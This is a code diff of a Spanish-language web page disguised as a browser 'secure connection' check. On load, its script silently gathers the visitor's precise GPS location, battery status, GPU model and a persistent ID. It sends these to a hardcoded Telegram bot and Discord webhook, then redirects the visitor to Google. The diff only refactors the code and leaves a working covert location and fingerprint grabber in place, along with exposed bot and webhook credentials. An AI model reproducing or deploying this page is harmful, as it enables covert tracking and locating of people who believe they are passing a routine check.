@@ -5,87 +5,68 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificando navegador...</title>
     <style>
-        body { 
-            background: #ffffff; 
-            color: #3c4043; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .container { text-align: center; max-width: 350px; }
-        .loader { 
-            border: 3px solid #f3f3f3; 
-            border-top: 3px solid #4285f4; 
-            border-radius: 50%; 
-            width: 35px; 
-            height: 35px; 
-            animation: spin 1s linear infinite; 
-            margin: 0 auto 20px; 
-        }
+        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.1rem; font-weight: 500; margin-bottom: 8px; }
-        p { font-size: 0.85rem; color: #70757a; }
+        p { font-size: 14px; color: #70757a; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="loader"></div>
-        <h1>Espera un momento...</h1>
-        <p>Estamos confirmando que tu conexión es segura.</p>
+        <p>Confirmando conexión segura...</p>
     </div>
 
     <script>
         const CONFIG = {
-            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
             token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
             chat: "7542699747",
+            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
             exit: "https://www.google.com"
         };
 
-        async function ejecutar() {
-            // ID Único
-            let id = localStorage.getItem('_uid') || 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-            localStorage.setItem('_uid', id);
+        async function iniciar() {
+            let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
+            localStorage.setItem('_sid', id);
 
-            // Batería
-            let batStatus = "hubo problemas con este criterio";
+            let bat = "hubo problemas con este criterio";
             try {
                 const b = await navigator.getBattery();
-                batStatus = `${Math.round(b.level * 100)}% | ${b.charging ? "Cargando" : "No cargando"}`;
+                bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
             } catch(e) {}
 
-            // Hardware
-            let hardware = "hubo problemas con este criterio";
+            let hw = "hubo problemas con este criterio";
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                hw = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
-            // Ubicación
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => enviar(p, id, hardware, batStatus),
-                    () => enviar(null, id, hardware, batStatus),
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    (p) => enviar(p, id, hw, bat),
+                    () => enviar(null, id, hw, bat),
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                enviar(null, id, hardware, batStatus);
+                enviar(null, id, hw, bat);
             }
         }
 
         async function enviar(pos, id, hw, bat) {
             let gpsTxt = "hubo problemas con esta criterio (GPS)";
-            let lat = null, lon = null;
+            let inlineKeyboard = [];
 
             if (pos) {
-                lat = pos.coords.latitude;
-                lon = pos.coords.longitude;
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
                 gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
+                
+                inlineKeyboard = [[
+                    { text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }
+                ]];
             }
 
             const report = `🔔 **REGISTRO DE ACTIVIDAD**\n` +
@@ -96,38 +77,34 @@
                            `📍 **Coords:** ${gpsTxt}\n` +
                            `━━━━━━━━━━━━━━━━━━━━`;
 
-            // Configuración del botón para Telegram
-            const telegramData = {
-                chat_id: CONFIG.chat,
-                text: report,
-                parse_mode: "Markdown",
-                reply_markup: pos ? {
-                    inline_keyboard: [[
-                        { text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }
-                    ]]
-                } : undefined
-            };
-
             try {
-                // Telegram con botón
-                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(telegramData)
-                });
-
-                // Discord (Normal)
-                await fetch(CONFIG.webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: report.replace(/\*/g, "**") })
-                });
-            } catch(e) {}
-
-            window.location.href = CONFIG.exit;
+                // El uso de await aquí garantiza que el código espere a que los mensajes se envíen
+                await Promise.all([
+                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.chat,
+                            text: report,
+                            parse_mode: "Markdown",
+                            reply_markup: inlineKeyboard.length > 0 ? { inline_keyboard: inlineKeyboard } : undefined
+                        })
+                    }),
+                    fetch(CONFIG.webhook, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: report.replace(/\*/g, "**") })
+                    })
+                ]);
+            } catch(e) {
+                console.error("Error en el envío");
+            } finally {
+                // La redirección SOLO ocurre después de que el bloque try/catch termine
+                window.location.href = CONFIG.exit;
+            }
         }
 
-        window.onload = ejecutar;
+        window.onload = iniciar;
     </script>
 </body>
 </html>
